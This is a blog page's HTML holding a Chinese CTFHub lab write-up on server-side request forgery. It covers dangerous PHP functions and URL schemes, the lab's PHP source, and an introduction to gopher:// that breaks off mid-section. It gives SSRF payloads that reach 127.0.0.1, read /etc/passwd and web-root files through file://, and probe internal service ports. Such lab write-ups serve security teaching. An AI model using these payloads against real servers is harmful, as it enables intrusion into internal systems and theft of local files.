@@ -1,0 +1,898 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    ssrf-ctfhub |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="ssrf-ctfhub什么是 SSRF?攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 …… SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。  正是因为它">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssrf-ctfhub">
+<meta property="og:url" content="http://example.com/2024/04/25/ssrf-ctfhub/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ssrf-ctfhub什么是 SSRF?攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 …… SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。  正是因为它">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240240545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240245394.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240241244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240241087.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241233525.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241232590.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241922075.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242112284.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242204376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242203397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404242203519.png">
+<meta property="article:published_time" content="2024-04-25T13:18:08.000Z">
+<meta property="article:modified_time" content="2024-04-26T20:11:56.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ssrf-ctfhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240240545.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">Friend</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="ssrf-ctfhub">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">ssrf-ctfhub</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrf-ctfhub"><span class="toc-number">1.</span> <span class="toc-text">ssrf-ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SSRF"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSRF?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">ssrf 漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfhub"><span class="toc-number">1.3.</span> <span class="toc-text">ctfhub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.2.</span> <span class="toc-text">伪协议读取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">1.3.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.5.</span> <span class="toc-text">上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.6.</span> <span class="toc-text">FastCGI协议 </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.7.</span> <span class="toc-text">redis协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-Bypass"><span class="toc-number">1.3.8.</span> <span class="toc-text">URL Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97IP-Bypass"><span class="toc-number">1.3.9.</span> <span class="toc-text">数字IP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC-Bypass"><span class="toc-number">1.3.10.</span> <span class="toc-text">302跳转 Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A-Bypass"><span class="toc-number">1.3.11.</span> <span class="toc-text">DNS重绑定 Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="John Doe" class="lazyload">
+  <div class="sidebar-author-name">John Doe</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-ssrf-ctfhub" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-04-25T13:18:08.000Z" itemprop="datePublished">2024-04-25</time>
+    <time style="display: none;" id="post-update-time">2024-04-27</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="ssrf-ctfhub"><a href="#ssrf-ctfhub" class="headerlink" title="ssrf-ctfhub"></a>ssrf-ctfhub</h1><h2 id="什么是-SSRF"><a href="#什么是-SSRF" class="headerlink" title="什么是 SSRF?"></a>什么是 SSRF?</h2><p>攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……</p>
+<p>SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p>
+<ul>
+<li>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</li>
+</ul>
+<h2 id="ssrf-漏洞产生原因"><a href="#ssrf-漏洞产生原因" class="headerlink" title="ssrf 漏洞产生原因"></a>ssrf 漏洞产生原因</h2><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<p>由于一些危险函数与危险协议。我们以 PHP 为例，列举一下这些危险函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">SoapClient</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>一些危险协议</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file://</span><br><span class="line">gopher</span><br><span class="line">dict</span><br><span class="line"></span><br><span class="line">etc...</span><br></pre></td></tr></table></figure>
+
+<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>点击loadurl会出现一个url跳转，补充完整127.0.0.1&#x2F;flag.php即可得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240240545.png"></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240245394.png"></p>
+<h3 id="伪协议读取"><a href="#伪协议读取" class="headerlink" title="伪协议读取"></a>伪协议读取</h3><p> <code>file伪协议</code>几乎是ssrf中最常用的伪协议 ,file:&#x2F;&#x2F; ,gopher ,dict, etc…</p>
+<p>提示是在web下，php  web默认是 &#x2F;var&#x2F;www&#x2F;html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240241244.png"></p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240241087.png"></p>
+<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=file:<span class="regexp">//</span><span class="regexp">/etc/pass</span>wd</span><br><span class="line">http:<span class="regexp">//</span>example.com/ssrf.php?url=file:<span class="regexp">//</span><span class="regexp">/C:/</span>Windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>8000-9000</p>
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241233525.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MySQL: 3306</span><br><span class="line">PostgreSQL: 5432</span><br><span class="line">FastCGI: 是由Web服务器（如Nginx或Apache）通过FastCGI协议与FastCGI进程通信。</span><br><span class="line">Redis: 6379</span><br><span class="line">SMTP (邮件服务): 25 (SMTP), 465 (SMTPS), 587 (submission) 是常见的SMTP端口，但具体使用哪个取决于配置。</span><br><span class="line">Zabbix: 10051 (Zabbix agent), 10052 (Zabbix server)</span><br><span class="line">Pymemcache: 由应用程序与Memcached服务器通信，通常使用默认的Memcached端口11211。</span><br><span class="line">Rbmemcache: 同样，Rbmemcache也是Memcached的Ruby客户端库，通常使用默认的Memcached端口11211。</span><br><span class="line">Phpmemcache: Phpmemcache是Memcached的PHP客户端库，同样通常使用默认的Memcached端口11211。</span><br><span class="line">Dmpmemcache: 我无法确定这个服务，但如果它也是Memcached的客户端库，那么它可能也使用默认的Memcached端口11211。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>访问： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404241232590.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得知：访问‘&#x2F;flag.php’路由可以获得key值，我们从127.0.0.1访问，key值对应就可以获得flag</p>
+<p>访问<code>?url=http://127.0.0.1/flag.php</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=51829de96f54bcc6e10e0d2ce29d4c7a--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/index.php</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Help: here is 302.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里有可以利用的curl_exec ()， 根据题目说“ 会跟踪302跳转 ”</p>
+<blockquote>
+<p>302跳转的302是http状态码</p>
+<p>表示请求的网页自请求的网页移动到了新的位置，搜索引擎索引中保存原来的URL</p>
+<p>这里可以通过访问302.php，并且传参gopher来伪造本地访问</p>
+</blockquote>
+<p>访问<code>?url=http://127.0.0.1/302.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">&#123;$_GET[&#x27;url&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h4><p>什么是gopher协议</p>
+<p><code>gopher</code>协议是一种信息查找系统，他将<code>Internet</code>上的文件组织成某种索引，方便用户从<code>Internet</code>的一处带到另一处。在<code>WWW</code>出现之前，<code>Gopher</code>是<code>Internet</code>上最主要的信息检索工具，Gopher站点也是最主要的站点，使用<code>tcp70</code>端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher协议的格式：gopher://ip:port/_METHOD /file HTTP/1.1 http-header&amp;body</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>gopher协议发送http get请求</li>
+</ul>
+<blockquote>
+<p>构造<code>HTTP</code>数据包</p>
+<p><code>URL</code>编码、替换回车换行为<code>%0d%0a</code>，<code>HTTP</code>包最后加<code>%0d%0a</code>代表消息结束</p>
+</blockquote>
+<ul>
+<li>gopher协议发送http post请求</li>
+</ul>
+<blockquote>
+<p><code>POST</code>与<code>GET</code>传参的区别：它有<code>4</code>个参数为必要参数</p>
+<p>需要传递<code>Content-Type</code>,<code>Content-Length</code>,<code>host</code>,<code>post</code>的参数</p>
+<p>然后构造<code>HTTP</code>数据包</p>
